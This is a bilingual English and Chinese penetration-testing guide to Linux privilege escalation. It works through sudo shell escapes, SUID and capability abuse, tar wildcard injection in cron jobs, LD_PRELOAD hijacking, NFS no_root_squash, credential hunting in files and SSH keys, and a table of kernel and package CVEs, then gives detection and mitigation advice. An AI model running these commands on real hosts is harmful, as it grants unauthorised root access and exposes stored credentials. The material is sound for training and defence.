---
id: linux-privilege-escalation
title_en: Linux Privilege Escalation
title_zh: Linux 提权
summary_en: Getting from a shell as an unprivileged user to root is almost never about finding a kernel bug first. It is about reading the system carefully — sudo rules, SUID binaries, capabilities, writable service files and cron jobs are where real hosts give themselves away.
summary_zh: 从一个普通用户的 shell 拿到 root，几乎从来不是先去找内核漏洞，而是把系统读仔细：sudo 规则、SUID、capabilities、可写的服务文件与定时任务，真实主机漏出来的地方基本都在这些位置。
tags: [linux, privilege-escalation, sudo, suid, capabilities, cron, red-team, pentest]
tools: [linpeas, pspy, GTFOBins, linux-exploit-suggester, getcap]
attck: [T1548.001, T1548.003, T1068, T1053.003]
platform: [linux]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Method, not a check-list

Kernel exploits are the last resort, not the first move. They are loud, they risk crashing the host, and on a hardened modern kernel the famous ones are patched. In practice, hosts fall over because of *configuration*: a sudo rule that runs the wrong binary, a SUID program from 2014, a service unit file that root will reload for you.

So the order is:

1. **Situational awareness.** Who am I, where am I, what is this box for?
2. **Configuration review.** sudo, SUID/SGID, capabilities, cron, writable files, PATH, NFS, credentials on disk.
3. **Version-based options.** Enumerate the kernel and installed software; only then consider a public exploit.

### Step 1 — Situational awareness

```bash
id; uname -a; cat /etc/os-release
hostname; ip a; ip route
sudo -n -l 2>/dev/null            # cached credentials, no prompt
env; echo "$PATH"
ls -la /home /opt /srv /var/www 2>/dev/null
cat /proc/1/cgroup                # container or not?
ls -la /                          # look for the box's purpose
```

Automation is worth it, as long as you read the output instead of skimming it:

```bash
# the standard sweep: permissions, credentials, services, kernel
./linpeas.sh -a | tee /dev/shm/peas.txt

# processes and their command lines, live — catches cron jobs you cannot see
./pspy64
```

### Step 2 — sudo, the most common way in

```bash
sudo -l
```

Read it properly. `(ALL) NOPASSWD: /usr/bin/find` is not "a restricted command": it is root, since `find` can execute programs:

```bash
sudo find . -exec /bin/sh \; -quit
```

Every binary in that list should be looked up on GTFOBins. The classic offenders are `find`, `vim`, `less`, `awk`, `perl`, `python`, `tar`, `zip`, `rsync`, `git`, `nmap`, `env`, `man`, `cp`, `tee`, and anything with a `--exec` or pager.

Watch for two more shapes:

```bash
# a wildcard in the rule lets you inject an argument
sudo /usr/bin/rsync -e 'sh -c "sh -i >&2 0>&1" ...'

# sudo for a script whose path you can write, or whose relative paths resolve to yours
sudo /opt/scripts/backup.sh
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/something       # only if env_keep allows it
```

If you have `sudo` rights on a binary that can read files, you can also read `/etc/shadow` and `/root/.ssh/id_rsa` — often faster than getting a shell.

### Step 3 — SUID and SGID

```bash
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
find / -perm -4000 -newermt 2010-01-01 2>/dev/null
```

An unusual SUID binary is the finding; a well-known one with a shell escape is the exploit. `nmap` with `--interactive`, an old `pkexec`, `mount`, `screen`, `exim`, or anything you have never heard of.

Two details that catch people out: SUID on a *script* usually means the SUID bit is ignored by the kernel (and if it is a `bash` script, it can still be a PATH or interpreter problem), and SGID on a directory can be as useful as root — it lets you write into a group-owned location.

### Step 4 — Capabilities

```bash
getcap -r / 2>/dev/null
```

Capabilities are the quiet version of SUID. Anything with `cap_setuid+ep` is instant root:

```bash
# python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# tar with cap_dac_read_search reads any file
/usr/bin/tar -cf /dev/shm/shadow.tar /etc/shadow
```

Worth knowing: `cap_setuid`, `cap_setgid`, `cap_dac_read_search`, `cap_dac_override`, `cap_sys_admin` (mount namespaces, container escape), `cap_sys_ptrace` (inject into a root process), `cap_net_raw`, `cap_net_admin`.

### Step 5 — Cron and timers

```bash
cat /etc/crontab; ls -la /etc/cron.*
systemctl list-timers --all
```

Then look for the three things that make a job exploitable:

- **A script you can write.** `-rwxrwxrwx /opt/backup.sh` run by root every minute is a shell.
- **A wildcard in the command.** `tar czf /backup/backup.tar.gz *` in a directory you can write to lets you drop `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` as filenames.
- **A relative path.** If the job calls `backup` rather than `/usr/local/bin/backup`, and your PATH reaches it first, it runs your binary.

`pspy` is how you find jobs that exist only in memory or in a container layer.

### Step 6 — PATH, unit files, and writable configuration

```bash
# PATH hijack: is any directory in PATH writable?
for d in $(echo $PATH | tr ':' ' '); do [ -w "$d" ] && echo "writable: $d"; done

# anything root runs that resolves through PATH, or any service file you can edit
find /etc/systemd /lib/systemd -writable -type f 2>/dev/null
systemctl list-units --type=service --state=running
```

An editable unit file or a writable binary inside a root-owned service path means you can make root run your code — no exploit, no crash, just configuration.

### Step 7 — Credentials lying around

```bash
grep -rIl -E 'password|passwd|secret|api[_-]?key' /home /var/www /opt /etc 2>/dev/null
cat ~/.bash_history; cat ~/.mysql_history
ls -la ~/.ssh; cat ~/.ssh/id_rsa 2>/dev/null
find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.ovpn' 2>/dev/null
cat /etc/fstab                      # NFS exports worth trying
```

Reused credentials are more common than any single misconfiguration. A password found in `/var/www/config.php` is often valid for `sudo` on the same box, or for SSH to the next one.

### NFS: `no_root_squash`

```bash
showmount -e 10.10.10.5
# on the attacker box, if the export is no_root_squash:
mkdir /mnt/nfs && mount -t nfs 10.10.10.5:/export /mnt/nfs
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
# back on the target
/export/bash -p
```

This is the classic `no_root_squash` escalation: your root-written SUID binary is root-owned on the target too.

### Step 8 — Kernel and package exploits

Only now, and only after checking what is actually patched:

```bash
uname -r
cat /etc/os-release
dpkg -l 2>/dev/null | grep -i -E 'polkit|sudo|kernel'    # or rpm -qa
```

The ones worth remembering, with their shapes:

| Vulnerability | Affects | Note |
|---|---|---|
| PwnKit (CVE-2021-4034) | pkexec, most distros pre-2022 | Reliable, no crash. |
| Baron Samedit (CVE-2021-3156) | sudo < 1.9.5p2 | Heap overflow via `sudoedit -s`. |
| DirtyPipe (CVE-2022-0847) | kernel 5.8 – 5.16.11 | Overwrite read-only files; often used on `/etc/passwd` or SUID binaries. |
| overlayfs (CVE-2023-0386) | kernel 5.11 – 6.2 | Filesystem copy-up, escapes to root. |
| Looney Tunables (CVE-2023-4911) | glibc 2.34+ | `GLIBC_TUNABLES` buffer overflow in ld.so. |

Compile and run these only when you accept the risk of a crash, and never on a production host without an explicit agreement. A privilege escalation that reboots a client's server is a failed engagement regardless of the shell you got.

### Container hints

```bash
cat /proc/1/cgroup; ls -la /.dockerenv
ls -la /var/run/docker.sock          # writable socket == instant root on the host
capsh --print | grep -i cap_sys_admin
mount | grep -E 'proc|sys'
```

A writable Docker socket or a `CAP_SYS_ADMIN` privileged container is a host escape, not a local privilege escalation — different report severity, different remediation.

### Detection

- **`auditd`** rules on `execve` for setuid/setgid binaries and on writes to `/etc/sudoers*`, `/etc/cron*`, `/etc/systemd`.
- Sudden SUID binaries in `/tmp`, `/dev/shm`, `/var/tmp` — almost always an attacker, occasionally a bad package.
- `sudo` log lines for unusual binaries, especially shell escapes from tools that are not shells.
- Unexpected outbound connections from a host process that should not make any.

### Mitigation

- Never grant `NOPASSWD` on a binary that can execute other programs; prefer a purpose-built wrapper, and validate its arguments.
- Audit SUID/SGID binaries periodically; remove the bit where it is not needed. Prefer capabilities with a narrow scope over SUID.
- Keep sudo, polkit, glibc and the kernel patched; these categories produce the escalation bugs everyone knows by name.
- Mount NFS exports with `root_squash` (and `all_squash` where possible).
- Keep cron scripts and systemd units root-owned and non-writable, with absolute paths and no wildcards.
- Do not store credentials in world-readable files; use a secrets mechanism.
- Treat container escape paths separately: no writable Docker socket, no privileged containers without a documented reason.

<!-- lang:zh -->
### 方法，而不是一张清单

内核漏洞是最后手段，不是第一招。它响、有把主机打挂的风险，而且在加固过的现代内核上，那些出名的都已经修了。实战里主机翻车基本都因为**配置**：一条指向错误二进制的 sudo 规则、一个 2014 年的 SUID 程序、一个 root 会替你重新加载的服务 unit 文件。

所以顺序是：

1. **摸清处境。** 我是谁、在哪、这台机器是干什么的。
2. **审配置。** sudo、SUID/SGID、capabilities、cron、可写文件、PATH、NFS、磁盘上的凭据。
3. **看版本。** 枚举内核和已安装软件，到这一步才考虑公开 exp。

### 第一步 —— 摸清处境

```bash
id; uname -a; cat /etc/os-release
hostname; ip a; ip route
sudo -n -l 2>/dev/null            # 用缓存的凭据，不弹提示
env; echo "$PATH"
ls -la /home /opt /srv /var/www 2>/dev/null
cat /proc/1/cgroup                # 判断是不是容器
ls -la /                          # 看这台机器的用途
```

自动化脚本值得跑，前提是你**真的读输出**而不是扫一眼：

```bash
# 标准一把梭：权限、凭据、服务、内核
./linpeas.sh -a | tee /dev/shm/peas.txt

# 实时监控进程与命令行，能抓到你看不见的定时任务
./pspy64
```

### 第二步 —— sudo，最常见的一道门

```bash
sudo -l
```

要逐条读。`(ALL) NOPASSWD: /usr/bin/find` 不是「一条被限制的命令」，它就是 root —— 因为 `find` 能执行程序：

```bash
sudo find . -exec /bin/sh \; -quit
```

列表里每一个二进制都该去 GTFOBins 查一遍。经典的惯犯是 `find`、`vim`、`less`、`awk`、`perl`、`python`、`tar`、`zip`、`rsync`、`git`、`nmap`、`env`、`man`、`cp`、`tee`，以及任何带 `--exec` 或者自带分页器的程序。

另外两种形态要留意：

```bash
# 规则里有通配符，你就能注入参数
sudo /usr/bin/rsync -e 'sh -c "sh -i >&2 0>&1" ...'

# sudo 执行的脚本路径可写，或者脚本里的相对路径会解析到你的文件
sudo /opt/scripts/backup.sh
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/某程序      # 仅在 env_keep 放行时有效
```

如果你对某个能读文件的程序有 sudo 权限，还可以直接读 `/etc/shadow` 和 `/root/.ssh/id_rsa` —— 往往比拿 shell 更快。

### 第三步 —— SUID 与 SGID

```bash
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
find / -perm -4000 -newermt 2010-01-01 2>/dev/null
```

一个不常见的 SUID 程序本身就是发现；一个已知有 shell 逃逸的 SUID 程序就是利用点。`nmap --interactive`、老版本的 `pkexec`、`mount`、`screen`、`exim`，以及你从没见过的任何东西。

两个容易踩的细节：给**脚本**加 SUID 通常会被内核直接忽略；而如果它是 `bash` 脚本，仍可能通过 PATH 或解释器出问题。另外，目录上的 SGID 有时和 root 一样有用 —— 它让你能写进一个属于某个组的目录。

### 第四步 —— Capabilities

```bash
getcap -r / 2>/dev/null
```

capabilities 是 SUID 的安静版本。任何带 `cap_setuid+ep` 的东西都是即时 root：

```bash
# 带 cap_setuid 的 python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# 带 cap_dac_read_search 的 tar 能读任意文件
/usr/bin/tar -cf /dev/shm/shadow.tar /etc/shadow
```

值得记住的几个：`cap_setuid`、`cap_setgid`、`cap_dac_read_search`、`cap_dac_override`、`cap_sys_admin`（挂载命名空间、容器逃逸）、`cap_sys_ptrace`（注入 root 进程）、`cap_net_raw`、`cap_net_admin`。

### 第五步 —— Cron 与 timer

```bash
cat /etc/crontab; ls -la /etc/cron.*
systemctl list-timers --all
```

然后找让任务可利用的三件事：

- **你能写的脚本。** 一个 root 每分钟执行的 `-rwxrwxrwx /opt/backup.sh`，就是 shell。
- **命令里有通配符。** 在你能写的目录里执行 `tar czf /backup/backup.tar.gz *`，你可以放两个文件名 `--checkpoint=1` 和 `--checkpoint-action=exec=sh shell.sh`。
- **相对路径。** 如果任务调用的是 `backup` 而不是 `/usr/local/bin/backup`，而你的 PATH 能先命中，那跑的就是你的程序。

`pspy` 是找出只存在于内存里、或藏在容器层里的任务的办法。

### 第六步 —— PATH、unit 文件、可写配置

```bash
# PATH 劫持：PATH 里有没有可写的目录？
for d in $(echo $PATH | tr ':' ' '); do [ -w "$d" ] && echo "writable: $d"; done

# root 会执行的东西，或者你能改的服务文件
find /etc/systemd /lib/systemd -writable -type f 2>/dev/null
systemctl list-units --type=service --state=running
```

一个可编辑的 unit 文件，或 root 服务路径里一个可写的二进制，就意味着你能让 root 执行你的代码 —— 不用漏洞，不用打挂任何东西，纯配置。

### 第七步 —— 散落的凭据

```bash
grep -rIl -E 'password|passwd|secret|api[_-]?key' /home /var/www /opt /etc 2>/dev/null
cat ~/.bash_history; cat ~/.mysql_history
ls -la ~/.ssh; cat ~/.ssh/id_rsa 2>/dev/null
find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.ovpn' 2>/dev/null
cat /etc/fstab                      # 值得一试的 NFS 导出
```

凭据复用比任何单项配置错误都更常见。在 `/var/www/config.php` 里翻到的口令，往往对本机的 `sudo` 有效，或者能直接 SSH 到下一台。

### NFS：`no_root_squash`

```bash
showmount -e 10.10.10.5
# 在攻击机上，如果导出开了 no_root_squash：
mkdir /mnt/nfs && mount -t nfs 10.10.10.5:/export /mnt/nfs
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
# 回到目标机
/export/bash -p
```

这就是经典的 `no_root_squash` 提权：你以 root 身份写进去的 SUID 程序，在目标机上也是 root 所有。

### 第八步 —— 内核与软件包漏洞

到这一步才做，而且要先确认哪些补丁真的没打：

```bash
uname -r
cat /etc/os-release
dpkg -l 2>/dev/null | grep -i -E 'polkit|sudo|kernel'    # 或 rpm -qa
```

值得记住的几个，以及它们的样子：

| 漏洞 | 影响范围 | 备注 |
|---|---|---|
| PwnKit (CVE-2021-4034) | pkexec，2022 年前的大多数发行版 | 稳定，不会把机器打挂。 |
| Baron Samedit (CVE-2021-3156) | sudo < 1.9.5p2 | 通过 `sudoedit -s` 触发堆溢出。 |
| DirtyPipe (CVE-2022-0847) | 内核 5.8 – 5.16.11 | 覆盖只读文件，常用来改 `/etc/passwd` 或 SUID 程序。 |
| overlayfs (CVE-2023-0386) | 内核 5.11 – 6.2 | 文件系统 copy-up，提权到 root。 |
| Looney Tunables (CVE-2023-4911) | glibc 2.34+ | ld.so 里 `GLIBC_TUNABLES` 缓冲区溢出。 |

只有在你能接受打挂风险时才编译运行它们；没有明确约定，永远不要在客户的生产主机上跑。一次把客户服务器搞重启的提权，无论你拿到了什么 shell，都算失败的交付。

### 容器的线索

```bash
cat /proc/1/cgroup; ls -la /.dockerenv
ls -la /var/run/docker.sock          # 可写的 socket 等于宿主机 root
capsh --print | grep -i cap_sys_admin
mount | grep -E 'proc|sys'
```

可写的 Docker socket，或一个带 `CAP_SYS_ADMIN` 的特权容器，属于**逃逸到宿主机**，而不是本机提权 —— 报告定级和修复方案都不一样。

### 检测

- `auditd` 针对 setuid/setgid 二进制的 `execve` 规则，以及对 `/etc/sudoers*`、`/etc/cron*`、`/etc/systemd` 的写入。
- `/tmp`、`/dev/shm`、`/var/tmp` 里突然出现的 SUID 程序 —— 基本都是攻击者，偶尔是打包事故。
- `sudo` 日志里出现不寻常的二进制，尤其是那些本身不是 shell 的工具跑出了 shell。
- 本该没有任何外连的进程突然发起外连。

### 缓解

- 永远不要给「能执行其他程序」的二进制配 `NOPASSWD`；改用专门写的包装脚本，并且校验它的参数。
- 定期审计 SUID/SGID，不需要的就把位去掉；能用范围更窄的 capabilities 就别用 SUID。
- 保持 sudo、polkit、glibc 和内核的补丁更新；这几类正是那些人人叫得出名字的提权漏洞的来源。
- NFS 导出使用 `root_squash`（条件允许时用 `all_squash`）。
- cron 脚本与 systemd unit 保持 root 所有且不可写，用绝对路径，不要通配符。
- 不要把凭据放在全局可读的文件里，改用密钥管理机制。
- 容器逃逸路径单独对待：不许有可写的 Docker socket，没有书面理由不许跑特权容器。
